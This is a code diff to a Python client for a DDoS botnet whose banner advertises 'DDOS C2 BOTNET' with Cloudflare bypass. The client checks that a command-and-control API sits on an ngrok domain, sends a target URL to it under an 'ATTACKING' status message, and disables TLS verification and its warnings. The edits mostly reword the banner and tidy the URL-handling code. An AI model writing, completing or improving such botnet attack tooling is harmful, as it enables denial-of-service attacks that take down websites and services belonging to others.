@@ -7,6 +7,10 @@ from rich.table import Table
 from rich.progress import Progress
 from urllib.parse import urlparse, urlunparse, quote
 import re
+import urllib3
+
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 console = Console()
 
@@ -17,9 +21,9 @@ def L():
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
 ⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Author : Dizflyze
-⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] DDOS C2
+⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] Denial Of Service
 ⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] Version : v1.3.2
-⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 26 MEI 2025
+⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] Update : 23 January
 ⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
 ⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
 ⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -27,47 +31,37 @@ def L():
     console.print(Panel.fit("DDOS C2 BOTNET DIZ FLYZE FULL BYPASS CLOUDFLARE", style="bold yellow", padding=(1,2)))
 
 def NU(user_input):
-    
-    user_input = user_input.strip()
-    
-    if not re.match(r'^https?://', user_input):
-        user_input = 'https://' + user_input
-    
     try:
+        user_input = user_input.strip()
+        if not re.match(r'^https?://', user_input):
+            user_input = 'https://' + user_input
         parsed = urlparse(user_input)
         if not parsed.netloc:
             return None
-        
         return urlunparse(parsed)
     except:
         return None
 
 def validate_api_url(url):
     try:
-        
         url = url.strip()
         if not url.startswith(('http://', 'https://')):
             url = 'https://' + url
-        
-        
         if not any(url.endswith(domain) for domain in ['.ngrok.io', '.ngrok-free.app']):
             return None
-            
         return url
     except:
         return None
 
 def SA(api_url, target):
     try:
-        with console.status("[bold green][ ATTACKING ]", spinner="dots12"):
-            
+        with console.status("[bold green][ ATTACKING ]", spinner="dots12") as status:
             encoded_target = quote(target, safe=':/')
-            
             
             info_response = requests.get(
                 f"{api_url}/info?target={encoded_target}",
                 timeout=10,
-                verify=False  
+                verify=False
             )
             
             if info_response.status_code != 200:
@@ -161,6 +155,4 @@ def main():
         console.print(f"[bold red][ ERROR ] : {str(e)}")
 
 if __name__ == "__main__":
-    import urllib3
-    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     main()
